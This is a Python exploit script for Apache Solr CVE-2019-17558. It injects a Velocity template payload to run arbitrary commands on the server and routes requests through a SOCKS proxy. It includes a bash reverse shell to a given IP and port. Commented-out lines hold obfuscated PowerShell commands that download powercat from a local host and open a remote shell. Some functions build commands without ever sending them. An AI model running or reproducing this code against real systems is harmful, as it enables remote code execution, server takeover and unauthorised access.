#!/bin/python3
# coding:utf-8

import requests
import sys
import json
requests.packages.urllib3.disable_warnings()

'''
apache solr Remote Code Execution
CVE-2019-17558
'''

#--------------------------
#proxies ={}
proxies = {'http':'socks5://192.168.111.130:9051','https':'socks5://192.168.111.130:9051'}
#--------------------------


def do_exp(url,cmd,core_name):
    vuln_url = url+"/solr/"+core_name+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"+cmd+"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    r = requests.request("GET", vuln_url, proxies=proxies, timeout=4)
    #print (r.text)

def run_own(url, cmd):
    try:
        core_url = url + "/solr/admin/cores?indexInfo=false&wt=json"
        r = requests.request("GET", url=core_url, proxies=proxies, timeout=4)
        core_name = list(json.loads(r.text)["status"])[0]
        print ("[+] GET API: "+url+"/solr/"+core_name+"/config")
        do_exp(url,cmd,core_name)
    except Exception as e:
        print ("[-] Target Not Vulnerable")
        #sys.exit(0)

        
def _verify(urlist, domain):
    try:
        for host in urlist :
            cmd = 'ping ' + host[1] + '.' + domain
            cmd = parse_cmd(cmd)
            run_own(host[0][:-1], cmd)
    except Exception as e:
        print(e)

def _cmd_exc(url, cmd):
    try:
        cmd = parse_cmd(cmd)
    except Exception as e:
        print(e)

def _get_shell(url, ip, port):
    try:
        #cmd_getshell = "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.111.130/powercat.ps1'); powercat -c 192.168.111.130 -p 9999 -e cmd"
        #cmd_getshell = "powershell set-alias -name kaspersky -value Invoke-Expression;\"$a1='kaspersky ((new-object net.webclient).downl';$a2='oadstring(''http://192.168.111.130/powercat.ps1''))';$4=';powercat -c 192.168.111.130 -p 9999 -e cmd';$a3=$a1,$a2,$4;kaspersky(-join $a3)\""
        cmd = '/bin/bash -i >&/dev/tcp/'+ip+'/'+port+'<&1'    
        cmd = parse_cmd(cmd)
    except Exception as e:
        print(e)

def parse_cmd(cmd):
    # it seems that urlparse.quote() is not working , we need repalce cmd str to urlencode manually.
    cmd = cmd.replace(" ","+")
    cmd = cmd.replace("=","%3D")
    cmd = cmd.replace(":","%22")
    cmd = cmd.replace("&","%26")
    cmd = cmd.replace("|","%7c")
    return cmd

    
